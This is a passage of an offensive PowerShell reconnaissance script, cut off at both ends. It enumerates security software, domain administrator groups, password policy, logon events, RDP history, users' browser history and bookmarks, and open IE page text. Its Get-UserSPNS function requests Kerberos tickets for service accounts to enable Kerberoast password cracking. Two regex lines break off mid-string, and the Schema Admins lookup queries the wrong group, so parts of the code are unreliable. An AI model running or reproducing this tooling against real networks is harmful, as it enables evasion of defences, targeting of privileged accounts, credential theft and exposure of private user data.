        "266240" {$defstatus = "Up to date" ;$rtstatus = "Enabled"} 
        "266256" {$defstatus = "Out of date" ;$rtstatus = "Enabled"} 
        "393216" {$defstatus = "Up to date" ;$rtstatus = "Disabled"} 
        "393232" {$defstatus = "Out of date" ;$rtstatus = "Disabled"} 
        "393488" {$defstatus = "Out of date" ;$rtstatus = "Disabled"} 
        "397312" {$defstatus = "Up to date" ;$rtstatus = "Enabled"} 
        "397328" {$defstatus = "Out of date" ;$rtstatus = "Enabled"} 
        "397584" {$defstatus = "Out of date" ;$rtstatus = "Enabled"} 
        "397568" {$defstatus = "Up to date"; $rtstatus = "Enabled"}
        "393472" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
    default {$defstatus = "Unknown" ;$rtstatus = "Unknown"} 
    }
    
    
    $ht = @{}
    $ht.Computername = $env:computername
    $ht.Name = $AntiVirusProduct.displayName
    $ht.'Product GUID' = $AntiVirusProduct.instanceGuid
    $ht.'Product Executable' = $AntiVirusProduct.pathToSignedProductExe
    $ht.'Reporting Exe' = $AntiVirusProduct.pathToSignedReportingExe
    $ht.'Definition Status' = $defstatus
    $ht.'Real-time Protection Status' = $rtstatus

    
    $Output = New-Object -TypeName PSObject -Property $ht 
    
    Return $Output
}

function Get-McafeeLogs {

    Write-Verbose "Enumerating Mcafee AV events..."
    
    $date = (get-date).AddDays(-14)
    $ProviderName = "McLogEvent"
    
    Try {
        $McafeeLogs = Get-WinEvent -FilterHashTable @{ logname = "Application"; StartTime = $date; ProviderName = $ProviderName; }
        $McafeeLogs |Select-Object -First 50 ID, Providername, DisplayName, TimeCreated, Level, UserID, ProcessID, Message
    }
    Catch {
        Write-Verbose "[-] Error getting McAfee AV event logs! $($Error[0])`n"
    }
}
    
function Get-AVProcesses {

    Write-Verbose "Enumerating potential AV processes..."
    $processes = Get-Process
    
    $avlookuptable = @{
                
                mcshield                    = "McAfee AV"
                windefend                   = "Windows Defender AV"
                MSASCui                     = "Windows Defender AV"
                msmpeng                     = "Windows Defender AV"
                msmpsvc                     = "Windows Defender AV"
                WRSA                        = "WebRoot AV"
                savservice                  = "Sophos AV"
                TMCCSF                      = "Trend Micro AV"
                "symantec antivirus"        = "Symantec AV"
                mbae                        = "MalwareBytes Anti-Exploit"
                parity                      = "Bit9 application whitelisting"
                cb                          = "Carbon Black behavioral analysis"
                "bds-vision"                = "BDS Vision behavioral analysis"
                Triumfant                   = "Triumfant behavioral analysis"
                CSFalcon                    = "CrowdStrike Falcon EDR"
                ossec                       = "OSSEC intrusion detection"
                TmPfw                       = "Trend Micro firewall"
                dgagent                     = "Verdasys Digital Guardian DLP"
                kvoop                       = "Unknown DLP process"
            }
            
    ForEach ($process in $processes) {
            ForEach ($key in $avlookuptable.keys){
            
                if ($process.ProcessName -match $key){
                    New-Object -TypeName PSObject -Property @{
                        AVProduct   = ($avlookuptable).Get_Item($key)
                        ProcessName = $process.ProcessName
                        PID         = $process.ID
                        }
                }
            }
    }
}
    
function Get-DomainAdmins {
  
    Write-Verbose "Enumerating Domain Administrators..."
    $Domain = [System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()
            
    Try {
        $DAgroup = ([adsi]"WinNT://$domain/Domain Admins,group")
        $Members = @($DAgroup.psbase.invoke("Members"))
        [Array]$MemberNames = $Members | ForEach{([ADSI]$_).InvokeGet("Name")}
        "`n[+] Domain Admins:`n"
        $MemberNames

        $EAgroup = ([adsi]"WinNT://$domain/Enterprise Admins,group")
        $Members = @($EAgroup.psbase.invoke("Members"))
        [Array]$MemberNames = $Members | ForEach{([ADSI]$_).InvokeGet("Name")}
        "`n[+] Enterprise Admins:`n"
        $MemberNames
        
        $SAgroup = ([adsi]"WinNT://$domain/Schema Admins,group")
        $Members = @($DAgroup.psbase.invoke("Members"))
        [Array]$MemberNames = $Members | ForEach{([ADSI]$_).InvokeGet("Name")}
        "`n[+] Schema Admins:`n"
        $MemberNames
    }
    Catch {
        Write-Verbose "[-] Error connecting to the domain while retrieving group members."    
    }
}

function Get-DomainAccountPolicy {
  

Write-Verbose "Enumerating domain account policy"
$Domain = [System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()

    Try {
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$domain)
        $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        $CurrentDomain = [ADSI]"WinNT://$env:USERDOMAIN"
        $Name = @{Name="DomainName";Expression={$_.Name}}
        $MinPassLen = @{Name="Minimum Password Length";Expression={$_.MinPasswordLength}}
        $MinPassAge = @{Name="Minimum Password Age (Days)";Expression={$_.MinPasswordAge.value/86400}}
        $MaxPassAge = @{Name="Maximum Password Age (Days)";Expression={$_.MaxPasswordAge.value/86400}}
        $PassHistory = @{Name="Enforce Password History (Passwords remembered)";Expression={$_.PasswordHistoryLength}}
        $AcctLockoutThreshold = @{Name="Account Lockout Threshold";Expression={$_.MaxBadPasswordsAllowed}}
        $AcctLockoutDuration =  @{Name="Account Lockout Duration (Minutes)";Expression={if ($_.AutoUnlockInterval.value -eq -1) {'Account is locked out until administrator unlocks it.'} else {$_.AutoUnlockInterval.value/60}}}
        $ResetAcctLockoutCounter = @{Name="Observation Window";Expression={$_.LockoutObservationInterval.value/60}}
        
        $CurrentDomain | Select-Object $Name,$MinPassLen,$MinPassAge,$MaxPassAge,$PassHistory,$AcctLockoutThreshold,$AcctLockoutDuration,$ResetAcctLockoutCounter
    }
    Catch {
            Write-Verbose "[-] Error connecting to the domain while retrieving password policy."    
    }
}
    


function Get-ComputerDetails {


    Param(
        [Parameter(Position=0)]
        [Switch]
        $ToString
    )
    Write-Verbose "Enumerating Event Logs for interesting entries (Get-ComputerDetails)..."

    
    
    Try {
        $SecurityLog = Get-EventLog -LogName Security
        $Filtered4624 = Find-4624Logons $SecurityLog
        $Filtered4648 = Find-4648Logons $SecurityLog
    }
    Catch{}
    
    $AppLockerLogs = Find-AppLockerLogs
    $PSLogs = Find-PSScriptsInPSAppLog
    $RdpClientData = Find-RDPClientConnections

    if ($ToString)
    {
        Write-Output "`nEvent ID 4624 (Logon):"
        Write-Output $Filtered4624.Values
        Write-Output "`nEvent ID 4648 (Explicit Credential Logon):"
        Write-Output $Filtered4648.Values
        Write-Output "`nAppLocker Process Starts:"
        Write-Output $AppLockerLogs.Values
        Write-Output "`nPowerShell Script Executions:"
        Write-Output $PSLogs.Values
        Write-Output "`nRDP Client Data:"
        Write-Output $RdpClientData.Values
    }
    else
    {
        $Properties = @{
            LogonEvent4624 = $Filtered4624.Values
            LogonEvent4648 = $Filtered4648.Values
            AppLockerProcessStart = $AppLockerLogs.Values
            PowerShellScriptStart = $PSLogs.Values
            RdpClientData = $RdpClientData.Values
        }

        $ReturnObj = New-Object PSObject -Property $Properties
        return $ReturnObj
    }
}


function Find-4648Logons
{

    Param(
        $SecurityLog
    )

    $ExplicitLogons = $SecurityLog | Where {$_.InstanceID -eq 4648}
    $ReturnInfo = @{}

    foreach ($ExplicitLogon in $ExplicitLogons)
    {
        $Subject = $false
        $AccountWhosCredsUsed = $false
        $TargetServer = $false
        $SourceAccountName = ""
        $SourceAccountDomain = ""
        $TargetAccountName = ""
        $TargetAccountDomain = ""
        $TargetServer = ""
        foreach ($line in $ExplicitLogon.Message -split "\r\n")
        {
            if ($line -cmatch "^Subject:$")
            {
                $Subject = $true
            }
            elseif ($line -cmatch "^Account\sWhose\sCredentials\sWere\sUsed:$")
            {
                $Subject = $false
                $AccountWhosCredsUsed = $true
            }
            elseif ($line -cmatch "^Target\sServer:")
            {
                $AccountWhosCredsUsed = $false
                $TargetServer = $true
            }
            elseif ($Subject -eq $true)
            {
                if ($line -cmatch "\s+Account\sName:\s+(\S.*)")
                {
                    $SourceAccountName = $Matches[1]
                }
                elseif ($line -cmatch "\s+Account\sDomain:\s+(\S.*)")
                {
                    $SourceAccountDomain = $Matches[1]
                }
            }
            elseif ($AccountWhosCredsUsed -eq $true)
            {
                if ($line -cmatch "\s+Account\sName:\s+(\S.*)")
                {
                    $TargetAccountName = $Matches[1]
                }
                elseif ($line -cmatch "\s+Account\sDomain:\s+(\S.*)")
                {
                    $TargetAccountDomain = $Matches[1]
                }
            }
            elseif ($TargetServer -eq $true)
            {
                if ($line -cmatch "\s+Target\sServer\sName:\s+(\S.*)")
                {
                    $TargetServer = $Matches[1]
                }
            }
        }

        
        if (-not ($TargetAccountName -cmatch "^DWM-.*" -and $TargetAccountDomain -cmatch "^Window\sManager$"))
        {
            $Key = $SourceAccountName + $SourceAccountDomain + $TargetAccountName + $TargetAccountDomain + $TargetServer
            if (-not $ReturnInfo.ContainsKey($Key))
            {
                $Properties = @{
                    LogType = 4648
                    LogSource = "Security"
                    SourceAccountName = $SourceAccountName
                    SourceDomainName = $SourceAccountDomain
                    TargetAccountName = $TargetAccountName
                    TargetDomainName = $TargetAccountDomain
                    TargetServer = $TargetServer
                    Count = 1
                    
                }

                $ResultObj = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $ResultObj)
            }
            else
            {
                $ReturnInfo[$Key].Count++
                
            }
        }
    }

    return $ReturnInfo
}

function Find-4624Logons
{

    Param (
        $SecurityLog
    )

    $Logons = $SecurityLog | Where {$_.InstanceID -eq 4624}
    $ReturnInfo = @{}

    foreach ($Logon in $Logons)
    {
        $SubjectSection = $false
        $NewLogonSection = $false
        $NetworkInformationSection = $false
        $AccountName = ""
        $AccountDomain = ""
        $LogonType = ""
        $NewLogonAccountName = ""
        $NewLogonAccountDomain = ""
        $WorkstationName = ""
        $SourceNetworkAddress = ""
        $SourcePort = ""

        foreach ($line in $Logon.Message -Split "\r\n")
        {
            if ($line -cmatch "^Subject:$")
            {
                $SubjectSection = $true
            }
            elseif ($line -cmatch "^Logon\sType:\s+(\S.*)")
            {
                $LogonType = $Matches[1]
            }
            elseif ($line -cmatch "^New\sLogon:$")
            {
                $SubjectSection = $false
                $NewLogonSection = $true
            }
            elseif ($line -cmatch "^Network\sInformation:$")
            {
                $NewLogonSection = $false
                $NetworkInformationSection = $true
            }
            elseif ($SubjectSection)
            {
                if ($line -cmatch "^\s+Account\sName:\s+(\S.*)")
                {
                    $AccountName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Account\sDomain:\s+(\S.*)")
                {
                    $AccountDomain = $Matches[1]
                }
            }
            elseif ($NewLogonSection)
            {
                if ($line -cmatch "^\s+Account\sName:\s+(\S.*)")
                {
                    $NewLogonAccountName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Account\sDomain:\s+(\S.*)")
                {
                    $NewLogonAccountDomain = $Matches[1]
                }
            }
            elseif ($NetworkInformationSection)
            {
                if ($line -cmatch "^\s+Workstation\sName:\s+(\S.*)")
                {
                    $WorkstationName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Source\sNetwork\sAddress:\s+(\S.*)")
                {
                    $SourceNetworkAddress = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Source\sPort:\s+(\S.*)")
                {
                    $SourcePort = $Matches[1]
                }
            }
        }

        
        if (-not ($NewLogonAccountDomain -cmatch "NT\sAUTHORITY" -or $NewLogonAccountDomain -cmatch "Window\sManager"))
        {
            $Key = $AccountName + $AccountDomain + $NewLogonAccountName + $NewLogonAccountDomain + $LogonType + $WorkstationName + $SourceNetworkAddress + $SourcePort
            if (-not $ReturnInfo.ContainsKey($Key))
            {
                $Properties = @{
                    LogType = 4624
                    LogSource = "Security"
                    SourceAccountName = $AccountName
                    SourceDomainName = $AccountDomain
                    NewLogonAccountName = $NewLogonAccountName
                    NewLogonAccountDomain = $NewLogonAccountDomain
                    LogonType = $LogonType
                    WorkstationName = $WorkstationName
                    SourceNetworkAddress = $SourceNetworkAddress
                    SourcePort = $SourcePort
                    Count = 1
                    
                }

                $ResultObj = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $ResultObj)
            }
            else
            {
                $ReturnInfo[$Key].Count++
                
            }
        }
    }

    return $ReturnInfo
}


function Find-AppLockerLogs
{

    $ReturnInfo = @{}

    $AppLockerLogs = Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -ErrorAction SilentlyContinue | Where {$_.Id -eq 8002}

    foreach ($Log in $AppLockerLogs)
    {
        $SID = New-Object System.Security.Principal.SecurityIdentifier($Log.Properties[7].Value)
        $UserName = $SID.Translate( [System.Security.Principal.NTAccount])

        $ExeName = $Log.Properties[10].Value

        $Key = $UserName.ToString() + "::::" + $ExeName

        if (!$ReturnInfo.ContainsKey($Key))
        {
            $Properties = @{
                Exe = $ExeName
                User = $UserName.Value
                Count = 1
                Times = @($Log.TimeCreated)
            }

            $Item = New-Object PSObject -Property $Properties
            $ReturnInfo.Add($Key, $Item)
        }
        else
        {
            $ReturnInfo[$Key].Count++
            $ReturnInfo[$Key].Times += ,$Log.TimeCreated
        }
    }

    return $ReturnInfo
}


function Find-PSScriptsInPSAppLog
{

    $ReturnInfo = @{}
    $Logs = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -ErrorAction SilentlyContinue | Where {$_.Id -eq 4100}

    foreach ($Log in $Logs)
    {
        $ContainsScriptName = $false
        $LogDetails = $Log.Message -split "`r`n"

        $FoundScriptName = $false
        foreach($Line in $LogDetails)
        {
            if ($Line -imatch "^\s*Script\sName\s=\s(.+)")
            {
                $ScriptName = $Matches[1]
                $FoundScriptName = $true
            }
            elseif ($Line -imatch "^\s*User\s=\s(.*)")
            {
                $User = $Matches[1]
            }
        }

        if ($FoundScriptName)
        {
            $Key = $ScriptName + "::::" + $User

            if (!$ReturnInfo.ContainsKey($Key))
            {
                $Properties = @{
                    ScriptName = $ScriptName
                    UserName = $User
                    Count = 1
                    Times = @($Log.TimeCreated)
                }

                $Item = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $Item)
            }
            else
            {
                $ReturnInfo[$Key].Count++
                $ReturnInfo[$Key].Times += ,$Log.TimeCreated
            }
        }
    }

    return $ReturnInfo
}


function Find-RDPClientConnections
{

    $ReturnInfo = @{}

    $Null = New-PSDrive -Name HKU -PSProvider Registry -Root Registry::HKEY_USERS -ErrorAction SilentlyContinue

    
    $Users = Get-ChildItem -Path "HKU:\"
    foreach ($UserSid in $Users.PSChildName)
    {
        $Servers = Get-ChildItem "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue

        foreach ($Server in $Servers)
        {
            $Server = $Server.PSChildName
            $UsernameHint = (Get-ItemProperty -Path "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers\$($Server)").UsernameHint
                
            $Key = $UserSid + "::::" + $Server + "::::" + $UsernameHint

            if (!$ReturnInfo.ContainsKey($Key))
            {
                $SIDObj = New-Object System.Security.Principal.SecurityIdentifier($UserSid)
                $User = ($SIDObj.Translate([System.Security.Principal.NTAccount])).Value

                $Properties = @{
                    CurrentUser = $User
                    Server = $Server
                    UsernameHint = $UsernameHint
                }

                $Item = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $Item)
            }
        }
    }

    return $ReturnInfo
}



function Get-BrowserInformation {

    [CmdletBinding()]
    Param
    (
        [Parameter(Position = 0)]
        [String[]]
        [ValidateSet('Chrome','IE','FireFox', 'All')]
        $Browser = 'All',

        [Parameter(Position = 1)]
        [String[]]
        [ValidateSet('History','Bookmarks','All')]
        $DataType = 'All',

        [Parameter(Position = 2)]
        [String]
        $UserName = '',

        [Parameter(Position = 3)]
        [String]
        $Search = ''
    )

    Write-Verbose "Enumerating web browser history..."

    function ConvertFrom-Json20([object] $item){
        
        Add-Type -AssemblyName System.Web.Extensions
        $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
        return ,$ps_js.DeserializeObject($item)
        
    }

    function Get-ChromeHistory {
        $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"
        if (-not (Test-Path -Path $Path)) {
            Write-Verbose "[-] Could not find Chrome History for username: $UserName"
        }
        $Regex = '(http|ftp|https|file)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+
        $Value = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"|Select-String -AllMatches $regex |% {$_.Matches}
        $Value | ForEach-Object {
            $Key = $_
            if ($Key -match $Search){
                New-Object -TypeName PSObject -Property @{
                    User = $UserName
                    Browser = 'Chrome'
                    DataType = 'History'
                    Data = $_.Value
                }
            }
        }        
    }

    function Get-ChromeBookmarks {
    $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    if (-not (Test-Path -Path $Path)) {
        Write-Verbose "[-] Could not find Chrome Bookmarks for username: $UserName"
    }   else {
            $Json = Get-Content $Path
            $Output = ConvertFrom-Json20($Json)
            $Jsonobject = $Output.roots.bookmark_bar.children
            
            $JsonObject | ForEach-Object {
                New-Object -TypeName PSObject -Property @{
                    User = $UserName
                    Browser = 'Chrome'
                    DataType = 'Bookmark'
                    Data = $_.item('url')
                    Name = $_.item('name')
                }
            }
        }
    }

    function Get-InternetExplorerHistory {
        

        $Null = New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS -ErrorAction SilentlyContinue
        $Paths = Get-ChildItem 'HKU:\' -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

        ForEach($Path in $Paths) {

            $User = ([System.Security.Principal.SecurityIdentifier] $Path.PSChildName).Translate( [System.Security.Principal.NTAccount]) | Select -ExpandProperty Value

            $Path = $Path | Select-Object -ExpandProperty PSPath

            $UserPath = "$Path\Software\Microsoft\Internet Explorer\TypedURLs"
            if (-not (Test-Path -Path $UserPath)) {
                Write-Verbose "[-] Could not find IE History for SID: $Path"
            }
            else {
                Get-Item -Path $UserPath -ErrorAction SilentlyContinue | ForEach-Object {
                    $Key = $_
                    $Key.GetValueNames() | ForEach-Object {
                        $Value = $Key.GetValue($_)
                        if ($Value -match $Search) {
                            New-Object -TypeName PSObject -Property @{
                                User = $UserName
                                Browser = 'IE'
                                DataType = 'History'
                                Data = $Value
                            }
                        }
                    }
                }
            }
        }
    }

    function Get-InternetExplorerBookmarks {
        $URLs = Get-ChildItem -Path "$Env:systemdrive\Users\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue
        ForEach ($URL in $URLs) {
            if ($URL.FullName -match 'Favorites') {
                $User = $URL.FullName.split('\')[2]
                Get-Content -Path $URL.FullName | ForEach-Object {
                    try {
                        if ($_.StartsWith('URL')) {
                            
                            $URL = $_.Substring($_.IndexOf('=') + 1)

                            if($URL -match $Search) {
                                New-Object -TypeName PSObject -Property @{
                                    User = $User
                                    Browser = 'IE'
                                    DataType = 'Bookmark'
                                    Data = $URL
                                }
                            }
                        }
                    }
                    catch {
                        Write-Verbose "Error parsing url: $_"
                    }
                }
            }
        }
    }

    function Get-FirefoxHistory {
        $Path = "$Env:systemdrive\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\"
        if (-not (Test-Path -Path $Path)) {
            Write-Verbose "[-] Could not find FireFox History for username: $UserName"
        }
        else {
            $Profiles = Get-ChildItem -Path "$Path\*.default\" -ErrorAction SilentlyContinue
            
            $Regex = '(http|ftp|https|file)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+
            $Value = Get-Content $Profiles\places.sqlite | Select-String -Pattern $Regex -AllMatches | Select-Object -ExpandProperty Matches |Sort -Unique
            $Value | ForEach-Object {
                    New-Object -TypeName PSObject -Property @{
                        User = $UserName
                        Browser = 'Firefox'
                        DataType = 'History'
                        Data = $_.Value
                        }    
                    }
        }
    }

    if (!$UserName) {
        $UserName = "$ENV:USERNAME"
    }

    if(($Browser -Contains 'All') -or ($Browser -Contains 'Chrome')) {
        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
            Get-ChromeHistory
        }
        if (($DataType -Contains 'All') -or ($DataType -Contains 'Bookmarks')) {
            Get-ChromeBookmarks
        }
    }

    if(($Browser -Contains 'All') -or ($Browser -Contains 'IE')) {
        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
            Get-InternetExplorerHistory
        }
        if (($DataType -Contains 'All') -or ($DataType -Contains 'Bookmarks')) {
            Get-InternetExplorerBookmarks
        }
    }

    if(($Browser -Contains 'All') -or ($Browser -Contains 'FireFox')) {
        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
            Get-FireFoxHistory
        }
    }
}

function Get-ActiveIEURLS {

    Param([switch]$Full, [switch]$Location, [switch]$Content)
    Write-Verbose "Enumerating active Internet Explorer windows"
    $urls = (New-Object -ComObject Shell.Application).Windows() |
    Where-Object {$_.LocationUrl -match "(^https?://.+)|(^ftp://)"} |
    Where-Object {$_.LocationUrl}
    if ($urls) {
        if($Full)
        {
            $urls
        }
        elseif($Location)
        {
            $urls | Select Location*
        }
        elseif($Content)
        {
            $urls | ForEach-Object {
                $_.LocationName;
                $_.LocationUrl;
                $_.Document.body.innerText
            }
        }
        else
        {
            $urls | Select-Object LocationUrl, LocationName
        }
    }
    else {
        Write-Verbose "[-] No active Internet Explorer windows found"
    }
}



function Get-UserSPNS {

  [CmdletBinding()]
  Param(
    [Parameter(Mandatory=$False,Position=1)] [string]$GCName,
    [Parameter(Mandatory=$False)] [string]$Filter,
    [Parameter(Mandatory=$False)] [switch]$Request,
    [Parameter(Mandatory=$False)] [switch]$UniqueAccounts
  )
  Write-Verbose "Enumerating user SPNs for potential Kerberoast cracking..."
  Add-Type -AssemblyName System.IdentityModel

  $GCs = @()

  If ($GCName) {
    $GCs += $GCName
  } else { 
    $ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $CurrentGCs = $ForestInfo.FindAllGlobalCatalogs()
    ForEach ($GC in $CurrentGCs) {
      
      $GCs += $ForestInfo.ApplicationPartitions[0].SecurityReferenceDomain
    }
  }

  if (-not $GCs) {
    
    Write-Output "`n[-] No Global Catalogs Found!"
    Return
  }

  ForEach ($GC in $GCs) {
      $searcher = New-Object System.DirectoryServices.DirectorySearcher
      $searcher.SearchRoot = "LDAP://" + $GC
      $searcher.PageSize = 1000
      $searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))"
      $Null = $searcher.PropertiesToLoad.Add("serviceprincipalname")
      $Null = $searcher.PropertiesToLoad.Add("name")
      $Null = $searcher.PropertiesToLoad.Add("samaccountname")
      
      
      $Null = $searcher.PropertiesToLoad.Add("memberof")
      $Null = $searcher.PropertiesToLoad.Add("pwdlastset")
      

      $searcher.SearchScope = "Subtree"

      $results = $searcher.FindAll()
      
      [System.Collections.ArrayList]$accounts = @()
          
      foreach ($result in $results) {
          foreach ($spn in $result.Properties["serviceprincipalname"]) {
              $o = Select-Object -InputObject $result -Property `
                  @{Name="ServicePrincipalName"; Expression={$spn.ToString()} }, `
                  @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `
                  
                  @{Name="SAMAccountName";       Expression={$result.Properties["samaccountname"][0].ToString()} }, `
                  
                  @{Name="MemberOf";             Expression={$result.Properties["memberof"][0].ToString()} }, `
                  @{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} } 
                  
              if ($UniqueAccounts) {
                  if (-not $accounts.Contains($result.Properties["samaccountname"][0].ToString())) {
                      $Null = $accounts.Add($result.Properties["samaccountname"][0].ToString())
                      $o
                      if ($Request) {
                          $Null = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString()
                      }
                  }
              } else {
                  $o
                  if ($Request) {
                      $Null = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString()
                  }
              }
          }
      }
  }
}


















function New-InMemoryModule
{


    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}




function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory=$True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{


    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

